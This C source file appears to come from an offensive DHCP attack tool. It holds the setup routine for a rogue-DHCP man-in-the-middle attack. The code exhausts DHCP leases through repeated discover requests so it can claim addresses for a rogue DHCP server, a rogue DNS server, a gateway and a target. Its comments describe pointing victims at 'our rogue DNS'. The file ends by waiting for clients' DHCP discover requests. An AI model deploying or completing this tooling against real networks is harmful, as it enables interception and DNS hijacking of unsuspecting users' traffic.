#include "gobbler.h"


extern int dhcpmitmstarted;
extern int dhcpgobbling;
extern int dhcpgobblestarted;
extern int dhcpreplyinfo;
int maninthemiddlestarted;
extern void startdhcpmitm(void);
extern void* status;
extern int phosts;
extern int mitmother;
extern int mitmdns;
extern int mitmsubnet;
extern int webserver;
extern int noprintinfo;

int mitmgivingout;
int dhcpmitmstarted;
int mitmgobble;
void startdhcpmitm(void)
{
	void thread_dhcpmitm(int);
	void startdhcpdiscover(void);
	extern int checkdhcp(int);
	int i, j, k, l, count;
	int allgood, rescan;

	i = 0;
	count = 0;
	allgood = 0;
	rescan = 0;
	
	mptr = calloc(MAXDHCPMITMHANDLER, sizeof(mitmthread));
	
	if(mptr == NULL){
		printf("Opps: calloc mptr error\n");
		exit(1);
	}
	
	dhcpgobbling = 1;
	dhcpgobblestarted = 1;
	dhcpreplyinfo = 1;

	if(mitmdns){
		count = 1 + 	1 +		1;
		//dhcp server, dns server, target host
		//
		//target uses normal gateway but our rogue DNS
	}

	if(mitmsubnet){
		count = 1 +	1 +		1 +		1;
		//dhcp server, dns server, target host, default gatway
	}

	if(mitmother){
		count = 1;
		//nat interface
		//
		//target will use another network's (rogue) ip range
		//in rogue range will have dhcp server, dns server, gateway
	}

	if(webserver && !mitmother) count++;
	mitmgobble = 1;
	printf("Trying to get some IP addresses\n");
	for(j = 0; j<count; j++){
		startdhcpdiscover(); //get ip and mac for dhcp server
		usleep(5000);
		noprintinfo = 1;
	}
	
	phosts = count;

	//for loop that checks over the ll to ensure
	//we have the right number of gobled hosts available
	//for mitm attack
	for(k=0; k<5; k++){
		l = checkdhcp(1);
		if(l == 1){
			printf("Opps: checkdhcp error\n");
			exit(1);
		}
		else if (l == 2){
			rescan = 1;
		}
		
		else if(!l){
			allgood = 1;
		}
		else {
			printf("Opps: checkdhcp error type\n\n");
			exit(1);
		}
		if(rescan){
			sleep(1);
		}
		if(allgood) k = 5;
	}
	
	if(rescan){
		if(checkdhcp(0) !=0){
			printf("Opps: checkdhcp error\n");
			exit(1);
		}
	}

	dhcpgobbling = 0;
	dhcpgobblestarted = 0;
	dhcpreplyinfo = 0;
	if(checkdhcp(0) !=0){
		printf("Opps: checkdhcp error\n");
		exit(1);
	}
	thread_dhcpmitm(i);
}
	
void thread_dhcpmitm(int i)
{
	void *mitm(void *);

	dhcpmitmstarted = 1;
	if(pthread_create(&mptr[i].thread_tid, NULL, &mitm, (void *)i)<0){
		printf("Opps: pthread_create error as %s\n\n", strerror(errno));
		exit(1);
	}
}

void mitm(void *tnum)
{
	u_char *dhcpserver;
	u_char *dnsserver;
	u_char *target;
	u_char *nat;
	u_char *gateway;
	PMT p_curr;


	p_curr = mtpoint;

	if(p_curr == NULL){
		printf("Opps: ll is empty (mitm)\n\n");
		exit(1);
	}

	
	pthread_detach(pthread_self());


	if(mitmother){
		while((p_curr != NULL) && p_curr->type != NAT){
			p_curr = (PMT) p_curr->nextmt;
		}
		if(p_curr == NULL){
			printf("Opps: couldn;t find IP address for DHCP server\n\n");
			exit(1);
		}
		
		nat = (u_char *)&(p_curr->ipaddress);
		printf("NAT IP %d.%d.%d.%d.... need to scan for private ranges for other IP's\n", nat[0], nat[1], nat[2], nat[3]);
		//exit(1);
	}
	
	else if(mitmsubnet || mitmdns){
		while((p_curr != NULL) && p_curr->type != DHCPSERVER){
			p_curr = (PMT) p_curr->nextmt;
		}
		if(p_curr == NULL){
			printf("Opps: couldn;t find IP address for DHCP server\n\n");
			exit(1);
		}
		
		dhcpserver = (u_char *)&(p_curr->ipaddress);

		p_curr = mtpoint;
		if(p_curr == NULL){
			printf("Opps: ll is empty (mitm)\n\n");
			exit(1);
		}

		while((p_curr != NULL) && p_curr->type != DNS){
			p_curr = (PMT) p_curr->nextmt;
		}
		if(p_curr == NULL){
			printf("Opps: couldn;t find IP address for DHCP server\n\n");
			exit(1);
		}
		
		dnsserver = (u_char *)&(p_curr->ipaddress);
		
		p_curr = mtpoint;
		if(p_curr == NULL){
			printf("Opps: ll is empty (mitm)\n\n");
			exit(1);
		}

		while((p_curr != NULL) && p_curr->type != TARGET){
			p_curr = (PMT) p_curr->nextmt;
		}
		if(p_curr == NULL){
			printf("Opps: couldn;t find IP address for DHCP server\n\n");
			exit(1);
		}
		
		target = (u_char *)&(p_curr->ipaddress);
		
		if(mitmsubnet){
			p_curr = mtpoint;
			if(p_curr == NULL){
				printf("Opps: ll is empty (mitm)\n\n");
				exit(1);
			}

			while((p_curr != NULL) && p_curr->type != GATEWAY){
				p_curr = (PMT) p_curr->nextmt;
			}
			if(p_curr == NULL){
				printf("Opps: couldn;t find IP address for DHCP server\n\n");
				exit(1);
			}
		
			gateway = (u_char *)&(p_curr->ipaddress);
		}
		
		printf("\nDHCP server IP %d.%d.%d.%d DNS server IP %d.%d.%d.%d, Target IP %d.%d.%d.%d", dhcpserver[0], dhcpserver[1], dhcpserver[2], dhcpserver[3], dnsserver[0], dnsserver[1], dnsserver[2], dnsserver[3], target[0], target[1], target[2], target[3]);
		if(mitmsubnet){
			printf(", Gateway %d.%d.%d.%d", gateway[0], gateway[1], gateway[2], gateway[3]);
		}
		printf("\n");
	}
	
	else {
		printf("Opps: Unknown MITM type\n");
		exit(1);
	}
	//if(mitmsubnet) printf("DHCP server IP %d.%d.%d.%d, DNS server IP %d.%d.%d.%d, Target IP %d.%d.%d.%d\n");
	
	//if(mitmother) printf("DHCP server IP %d.%d.%d.%d, DNS server IP %d.%d.%d.%d, Target IP %d.%d.%d.%d, NAT Gateway %d.%d.%d.%d\n");
	maninthemiddlestarted = 1;
	mitmgivingout = 1;
	printf("\nMITM initalized waiting for client to send dhcp discover\n\n");
	for(;;) {
		sleep(1);
	}
}
